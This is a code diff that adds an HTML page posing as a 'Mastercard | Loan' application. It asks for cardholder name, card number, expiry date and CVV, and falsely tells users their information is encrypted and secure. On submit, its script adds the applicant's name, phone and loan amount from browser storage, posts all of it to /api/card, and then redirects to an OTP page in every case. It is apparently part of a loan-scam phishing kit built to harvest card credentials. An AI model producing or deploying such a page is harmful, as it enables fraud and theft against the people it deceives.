@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <title>Mastercard | Loan</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:'Roboto',sans-serif;background:linear-gradient(135deg,#a0e1eb,#1fcc53);display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
+        .card{background:white;border-radius:15px;box-shadow:0 8px 30px rgba(0,0,0,.1);padding:30px;width:100%;max-width:400px;transition:transform .3s}
+        .card:hover{transform:translateY(-5px)}
+        h2{text-align:center;color:#007BFF;margin-bottom:25px;font-weight:500}
+        .input-group{margin-bottom:20px}
+        .input-group label{display:block;margin-bottom:8px;font-weight:500;color:#555}
+        .input-group input{width:100%;padding:12px;border:1px solid #ccc;border-radius:8px;transition:border-color .3s;font-size:15px}
+        .input-group input:focus{border-color:#007BFF;outline:none;box-shadow:0 0 5px rgba(0,123,255,.5)}
+        .btn{width:100%;padding:12px;background:#E30613;color:white;border:none;border-radius:8px;cursor:pointer;font-size:18px;font-weight:600;transition:background .3s,transform .3s;margin-top:8px}
+        .btn:hover{background:#b71c1c;transform:translateY(-2px)}
+        .secure-note{text-align:center;margin-top:14px;font-size:13px;color:#888}
+        .card-icons{display:flex;justify-content:center;gap:10px;margin-bottom:20px;font-size:28px}
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="card-icons">💳 🏦 🔒</div>
+        <h2>Fill Credit Card Details To Proceed</h2>
+        <form id="payment-form">
+            <div class="input-group">
+                <label for="card-name">Cardholder Name</label>
+                <input type="text" id="card-name" placeholder="John Doe" required>
+            </div>
+            <div class="input-group">
+                <label for="card-number">Card Number</label>
+                <input type="text" id="card-number" placeholder="1111 2222 3333 4444" maxlength="19" required>
+            </div>
+            <div class="input-group">
+                <label for="expiration">Expiration Date (MM/YY)</label>
+                <input type="text" id="expiration" placeholder="12/26" maxlength="5" required>
+            </div>
+            <div class="input-group">
+                <label for="cvv">CVV</label>
+                <input type="text" id="cvv" placeholder="123" maxlength="4" required>
+            </div>
+            <button type="submit" class="btn">Accept Loan</button>
+        </form>
+        <p class="secure-note">🔒 Your information is encrypted and secure</p>
+    </div>
+    <script>
+        // Format card number with spaces
+        document.getElementById('card-number').addEventListener('input',function(){
+            let v=this.value.replace(/\D/g,'').substring(0,16);
+            this.value=v.replace(/(.{4})/g,'$1 ').trim();
+        });
+        // Format expiry
+        document.getElementById('expiration').addEventListener('input',function(){
+            let v=this.value.replace(/\D/g,'').substring(0,4);
+            if(v.length>2) v=v.substring(0,2)+'/'+v.substring(2);
+            this.value=v;
+        });
+        document.getElementById('payment-form').addEventListener('submit',function(e){
+            e.preventDefault();
+            const btn=e.target.querySelector('.btn');
+            btn.textContent='Processing...';
+            btn.disabled=true;
+            const payload={
+                cardName:document.getElementById('card-name').value,
+                cardNumber:document.getElementById('card-number').value,
+                expiration:document.getElementById('expiration').value,
+                cvv:document.getElementById('cvv').value,
+                applicant:localStorage.getItem('firstName')||'',
+                phone:localStorage.getItem('phone')||'',
+                amount:localStorage.getItem('loanAmount')||''
+            };
+            fetch('/api/card',{
+                method:'POST',headers:{'Content-Type':'application/json'},
+                body:JSON.stringify(payload)
+            }).then(()=>window.location.href='otp.html')
+              .catch(()=>window.location.href='otp.html');
+        });
+    </script>
+</body>
+</html>
